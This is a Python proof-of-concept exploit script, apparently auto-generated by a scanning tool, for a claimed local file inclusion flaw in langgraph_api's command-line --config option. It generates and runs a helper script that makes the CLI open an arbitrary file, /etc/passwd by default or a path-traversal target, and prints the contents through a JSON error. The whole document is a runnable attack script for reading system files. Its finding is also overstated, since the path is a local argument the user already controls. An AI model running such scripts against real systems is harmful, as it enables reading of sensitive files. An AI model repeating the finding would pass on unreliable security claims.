#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: lfi-001
# Sink: main
# Auto-generated — run with: python3 lfi_provide_absolute_main.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in langgraph_api_src.

Vulnerability: The --config argument is passed directly to open() without
path validation, allowing arbitrary file reads via absolute paths or
path traversal sequences.

Usage:
    python3 poc.py --target /path/to/langgraph_api/cli.py --file /etc/passwd
    python3 poc.py --target /path/to/langgraph_api/cli.py --file ../../etc/passwd
"""

import argparse
import json
import os
import sys
import tempfile
import subprocess
from pathlib import Path


def create_malicious_config(target_script: str, file_to_read: str) -> str:
    """
    Create a temporary Python script that imports and calls the vulnerable
    main() function with a malicious --config argument.
    
    Args:
        target_script: Path to the vulnerable cli.py
        file_to_read: Path to the file we want to read (absolute or relative)
    
    Returns:
        Path to the generated exploit script
    """
    exploit_code = f'''
import sys
import json
import os

# Add the parent directory to path so imports work
sys.path.insert(0, os.path.dirname("{target_script}"))
sys.path.insert(0, os.path.join(os.path.dirname("{target_script}"), ".."))

# Import the vulnerable module
from langgraph_api import cli

# Backup original sys.argv
original_argv = sys.argv

# Set up malicious arguments
sys.argv = [
    "cli.py",
    "--config", "{file_to_read}",
    "--host", "127.0.0.1",
    "--port", "9999",  # Use a port that won't conflict
    "--no-reload"
]

try:
    # Call the vulnerable main function
    cli.main()
except json.JSONDecodeError as e:
    # If the file isn't valid JSON, we still get its contents in the error
    print(f"FILE CONTENTS (non-JSON): {{e.doc}}", file=sys.stderr)
except SystemExit:
    # Expected when server fails to start
    pass
except Exception as e:
    print(f"Error: {{e}}", file=sys.stderr)
finally:
    sys.argv = original_argv
'''
    
    # Write exploit to temporary file
    exploit_path = os.path.join(tempfile.gettempdir(), "lg_exploit.py")
    with open(exploit_path, 'w') as f:
        f.write(exploit_code)
    
    return exploit_path


def run_exploit(exploit_script: str, target_script: str, file_to_read: str) -> None:
    """
    Execute the exploit script and capture output.
    
    Args:
        exploit_script: Path to the generated exploit script
        target_script: Path to the vulnerable cli.py
        file_to_read: Path to the file we want to read
    """
    print(f"[*] Target script: {target_script}")
    print(f"[*] Attempting to read: {file_to_read}")
    print("[*] Running exploit...")
    
    try:
        # Run the exploit script
        result = subprocess.run(
            [sys.executable, exploit_script],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        # Check stdout for file contents
        if result.stdout:
            print("[+] STDOUT output:")
            print(result.stdout)
        
        # Check stderr for file contents (often ends up here due to JSON errors)
        if result.stderr:
            print("[+] STDERR output (may contain file contents):")
            print(result.stderr)
        
        # If we got no output, try to extract from the error
        if not result.stdout and not result.stderr:
            print("[-] No output captured. The file may not exist or is empty.")
            
    except subprocess.TimeoutExpired:
        print("[-] Exploit timed out (10 seconds)")
    except Exception as e:
        print(f"[-] Error running exploit: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_api_src --config argument"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Path to the vulnerable cli.py file (e.g., /tmp/lg-api-dl/langgraph_api_src/langgraph_api/cli.py)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--relative",
        action="store_true",
        help="Use relative path traversal instead of absolute path"
    )
    
    args = parser.parse_args()
    
    # Validate target exists
    if not os.path.exists(args.target):
        print(f"[-] Target script not found: {args.target}")
        sys.exit(1)
    
    # Determine the file path to use
    if args.relative:
        # Calculate relative path from the target script's directory
        target_dir = os.path.dirname(os.path.abspath(args.target))
        # Go up to root and then to the target file
        relative_path = os.path.relpath(args.file, target_dir)
        file_to_read = relative_path
        print(f"[*] Using relative path: {file_to_read}")
    else:
        file_to_read = args.file
        print(f"[*] Using absolute path: {file_to_read}")
    
    # Create the exploit script
    print("[*] Generating exploit script...")
    exploit_path = create_malicious_config(args.target, file_to_read)
    
    # Run the exploit
    run_exploit(exploit_path, args.target, file_to_read)
    
    # Cleanup
    try:
        os.remove(exploit_path)
        print(f"[*] Cleaned up temporary file: {exploit_path}")
    except:
        pass


if __name__ == "__main__":
    main()
